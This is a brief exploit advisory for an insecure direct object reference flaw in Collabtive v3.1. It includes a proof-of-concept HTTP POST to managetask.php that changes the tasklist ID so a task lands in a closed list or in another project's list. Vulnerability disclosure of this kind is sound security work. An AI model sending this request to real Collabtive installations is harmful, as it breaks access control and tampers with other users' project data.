# Exploit Title: Collabtive v3.1 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://github.com/philippK-de/Collabtive
## Tested on: Debian Linux, Apache, Mysql
## Vendor: philippK-de
## Version: v3.1
## Exploit Description:
## Collabtive v3.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to add task in the tasklist that is closed or belongs to other project(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /managetask.php?action=add&id=1 HTTP/1.1
...

&title=T1&=&=&=&=&=&=&=&=&=&=&=&=&text=TTTTT&start=05.01.2024&end=05.01.2024&assigned[]=2&tasklist=1(CHANGE HERE)&=&=
```